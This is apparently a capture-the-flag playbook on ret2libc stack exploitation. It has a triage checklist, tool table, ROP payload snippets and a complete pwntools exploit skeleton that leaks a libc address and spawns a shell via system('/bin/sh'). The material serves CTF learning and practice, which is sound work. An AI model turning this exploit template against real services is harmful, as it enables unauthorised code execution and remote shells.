# Pwn ret2libc

## When to suspect this

- NX enabled, no direct win function, stack overflow controls RIP.
- Binary imports `puts`, `printf`, `read`, `write`, `setvbuf`, etc.
- You can leak a GOT address and return to main.
- Provided libc/ld files exist or remote leak can identify libc.

## Fast triage checklist

- Run `checksec`.
- Confirm RIP control and offset.
- Find `pop rdi; ret` and `ret` alignment.
- Leak a libc address with `puts@plt(puts@got)`.
- Return to main/vuln.
- Calculate libc base.
- Call `system("/bin/sh")` or ORW.

## Manual confirmation

```bash
checksec --file=./chall
ROPgadget --binary ./chall | rg 'pop rdi|ret'
readelf -r ./chall | rg 'puts|printf|read|write'
```

Positive signal:

- Leak bytes parse to plausible libc address ending in page alignment.
- `libc.address = leak - libc.sym['puts']` produces mapped base.
- Second stage spawns shell or prints flag.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/pwn/ret2libc_template.py](../scripts/pwn/ret2libc_template.py) | Standard two-stage exploit | `python3 scripts/pwn/ret2libc_template.py REMOTE` | Leak then shell |
| pwntools | ELF/libc/ROP scripting | `ELF`, `ROP`, `flat` | Fast exploit |
| one_gadget | Candidate one-shot | `one_gadget libc.so.6` | Constraints listed |
| libc database | Unknown libc | lookup leaked symbols | libc version |
| DynELF | Arbitrary leak primitive | pwntools DynELF | Symbol resolution |

## Payload starter pack

Leak stage:

```python
payload = flat(
    b"A"*offset,
    pop_rdi, elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
```

Shell stage:

```python
payload = flat(
    b"A"*offset,
    ret,
    pop_rdi, next(libc.search(b"/bin/sh")),
    libc.sym["system"],
)
```

## Exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6")
HOST, PORT = "HOST", 1337
offset = 72

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = flat(b"A"*offset, pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"])
io.sendlineafter(b"> ", payload)
leak = u64(io.recvline().strip().ljust(8, b"\0"))
libc.address = leak - libc.sym["puts"]
log.info(f"libc base = {hex(libc.address)}")

payload = flat(b"A"*offset, ret, pop_rdi, next(libc.search(b"/bin/sh")), libc.sym["system"])
io.sendlineafter(b"> ", payload)
io.interactive()
```

## Escalation path

- If libc unknown, leak multiple symbols and identify.
- If no `pop rdi`, use ret2csu.
- If `system` blocked/crashes, use syscall ROP or ORW.
- If Full RELRO, leaks still work but GOT overwrite does not.
- If seccomp blocks execve, build ORW chain.

## Common bypasses

- Extra `ret` for stack alignment.
- Leak `puts`, `printf`, `read`, or `__libc_start_main` return.
- Return to vuln/main for second stage.
- Use actual fd from `open()` return in ORW.
- Use static binary `/bin/sh` string if libc unavailable.

## Rabbit holes

- Parsing leak line incorrectly.
- Using host libc instead of provided/remote libc.
- Ignoring PIE base for binary gadgets.
- Trying one_gadget without satisfying constraints.

## Final solve checklist

- Offset and leak stage are stable.
- libc base calculation is verified.
- Second stage works locally and remotely.
- Final command reads flag with minimal interaction.

